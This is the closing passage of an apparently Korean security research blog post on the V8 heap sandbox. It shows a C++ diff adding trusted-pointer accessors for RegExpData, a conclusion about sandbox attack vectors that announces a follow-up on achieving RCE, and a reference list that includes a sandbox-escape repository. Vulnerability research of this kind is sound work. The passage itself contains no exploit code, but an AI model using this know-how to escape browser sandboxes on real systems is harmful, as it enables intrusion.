+  Tagged<Smi> value = TaggedField<Smi, kFlagsOffset>::load(*this);
+  return JSRegExp::Flags(value.value());
+}
+
+void RegExpData::set_flags(JSRegExp::Flags flags) {
+  TaggedField<Smi, kFlagsOffset>::store(*this, Smi::FromInt(flags));
+}
+
+ACCESSORS(RegExpData, wrapper, Tagged<RegExpDataWrapper>, kWrapperOffset)
+
+int RegExpData::capture_count() const {
+  switch (type_tag()) {
+    case Type::ATOM:
+      return 0;
+    case Type::EXPERIMENTAL:
+    case Type::IRREGEXP:
+      return Cast<IrRegExpData>(*this)->capture_count();
+  }
+}
+
+TRUSTED_POINTER_ACCESSORS(RegExpDataWrapper, data, RegExpData, kDataOffset,
+                          kRegExpDataIndirectPointerTag)
+
+ACCESSORS(AtomRegExpData, pattern, Tagged<String>, kPatternOffset)
+
+CODE_POINTER_ACCESSORS(IrRegExpData, latin1_code, kLatin1CodeOffset)
+CODE_POINTER_ACCESSORS(IrRegExpData, uc16_code, kUc16CodeOffset)
+bool IrRegExpData::has_code(bool is_one_byte) const {
+  return is_one_byte ? has_latin1_code() : has_uc16_code();
+}
+void IrRegExpData::set_code(bool is_one_byte, Tagged<Code> code) {
+  if (is_one_byte) {
+    set_latin1_code(code);
+  } else {
+    set_uc16_code(code);
+  }
+}
+Tagged<Code> IrRegExpData::code(IsolateForSandbox isolate,
+                                bool is_one_byte) const {
+  return is_one_byte ? latin1_code(isolate) : uc16_code(isolate);
+}
+PROTECTED_POINTER_ACCESSORS(IrRegExpData, latin1_bytecode, TrustedByteArray,
+                            kLatin1BytecodeOffset)
+PROTECTED_POINTER_ACCESSORS(IrRegExpData, uc16_bytecode, TrustedByteArray,
+                            kUc16BytecodeOffset)
+bool IrRegExpData::has_bytecode(bool is_one_byte) const {
+  return is_one_byte ? has_latin1_bytecode() : has_uc16_bytecode();
+}
+void IrRegExpData::clear_bytecode(bool is_one_byte) {
+  if (is_one_byte) {
+    clear_latin1_bytecode();
+  } else {
+    clear_uc16_bytecode();
+  }
+}
+void IrRegExpData::set_bytecode(bool is_one_byte,
+                                Tagged<TrustedByteArray> bytecode) {
+  if (is_one_byte) {
+    set_latin1_bytecode(bytecode);
+  } else {
+    set_uc16_bytecode(bytecode);
+  }
+}
+Tagged<TrustedByteArray> IrRegExpData::bytecode(bool is_one_byte) const {
+  return is_one_byte ? latin1_bytecode() : uc16_bytecode();
+}
+ACCESSORS(IrRegExpData, capture_name_map, Tagged<Object>, kCaptureNameMapOffset)
+void IrRegExpData::set_capture_name_map(Handle<FixedArray> capture_name_map) {
+  if (capture_name_map.is_null()) {
+    set_capture_name_map(Smi::zero());
+  } else {
+    set_capture_name_map(*capture_name_map);
+  }
+}
+
+SMI_ACCESSORS(IrRegExpData, max_register_count, kMaxRegisterCountOffset)
+SMI_ACCESSORS(IrRegExpData, capture_count, kCaptureCountOffset)
+SMI_ACCESSORS(IrRegExpData, ticks_until_tier_up, kTicksUntilTierUpOffset)
+SMI_ACCESSORS(IrRegExpData, backtrack_limit, kBacktrackLimitOffset)
+
 }  // namespace internal
 }  // namespace v8
 
```

# 5. Conclusion

최근 대부분의 OS와 브라우저에서 취약점을 패치하는 부분도 지속적으로 이루어지고 있지만, AAR/W를 얻은 이후 흐름 제어 부분을 막는 CFI를 강화하는 쪽으로 전략을 세우고 있습니다. 이는 한정된 자원으로 우후죽순 생겨나는 취약점을 막을 수 없다고 판단하여 취약점이 발생하더라도 익스플로잇까지 연결되지 않게 막고 있습니다. CFI 역할도 수행하는 V8 Sandbox는 단순히 index table, offset에 대한 관리 뿐만 아니라 샌드박스 메모리 내에 존재하여 OOB가 발생할 수 있는 index 부분도 전부 관리해주어야 합니다. 따라서 V8내에 다양한 공격벡터가 나올 수 있다고 볼 수 있습니다.

추가적으로 [참조 [8]](https://docs.google.com/document/d/12MsaG6BYRB-jQWNkZiuM3bY8X2B2cAsCMLLdgErvK4c/edit?tab=t.0#heading=h.xzptrog8pyxf)에 따르면 하드웨어의 힘을 빌려 커널과 유저 모드를 나눈 것 처럼 신뢰할 수 없는 JS, WASM 코드를 실행할때 더 낮은 권한으로 실행하는 것을 목표로 설계를 진행하고 있습니다.

두 번째 시리즈에서는 실제 Caged AAR/W 취약점과 이번 글에서 설명한 취약점을 사용하여 V8에서 RCE를 획득하는 방법에 대해서 소개하겠습니다. 

글을 마무리 하며, [개인 블로그](https://kangwoosun.github.io/)에는 영어 버전도 게시할 예정이니 필요하신 분은 참고해주세요 :)

# **6. Reference**

- [The V8 Sandbox - Readme](https://chromium.googlesource.com/v8/v8.git/+/refs/heads/main/src/sandbox/README.md) - [1]
- [V8 Sandbox - High-Level Design Doc](https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit?tab=t.0#heading=h.xzptrog8pyxf) - [2]
- [V8 Sandbox - Address Space](https://docs.google.com/document/d/1PM4Zqmlt8ac5O8UNQfY7fOsem-6MhbsB-vjFI-9XK6w/edit?tab=t.0#heading=h.xzptrog8pyxf) - [3]
- [V8 Sandbox - Sandboxed Pointers](https://docs.google.com/document/d/1HSap8-J3HcrZvT7-5NsbYWcjfc0BVoops5TDHZNsnko/edit?tab=t.0#heading=h.suker1x4zgzz) - [4]
- [V8 Sandbox - External Pointer Sandboxing](https://docs.google.com/document/d/1V3sxltuFjjhp_6grGHgfqZNK57qfzGzme0QTk0IXDHk/edit?tab=t.0#heading=h.xzptrog8pyxf) - [5]
- [V8 Sandbox - Code Pointer Sandboxing](https://docs.google.com/document/d/1CPs5PutbnmI-c5g7e_Td9CNGh5BvpLleKCqUnqmD82k/edit?tab=t.0#heading=h.xzptrog8pyxf) - [6]
- [V8 Sandbox - Trusted Space](https://docs.google.com/document/d/1IrvzL4uX_Zv0k2Iakdp_q_z33bj-qlYF5IesGpXW0fM/edit?tab=t.0#heading=h.xzptrog8pyxf) - [7]
- [V8 Sandbox - Hardware Support](https://docs.google.com/document/d/12MsaG6BYRB-jQWNkZiuM3bY8X2B2cAsCMLLdgErvK4c/edit?tab=t.0#heading=h.xzptrog8pyxf) - [8]
- https://v8.dev/blog/sandbox - [9]
- https://v8.dev/blog/pointer-compression - [10]
- https://v8.dev/blog/non-backtracking-regexp - [11]
- https://issues.chromium.org/issues/330404819 - [12]
- https://github.com/rycbar77/V8-Sandbox-Escape-via-Regexp - [13]
- https://saelo.github.io/presentations/offensivecon_24_the_v8_heap_sandbox.pdf - [14]
- https://chromium.googlesource.com/chromium/src/+/HEAD/docs/design/sandbox.md - [15]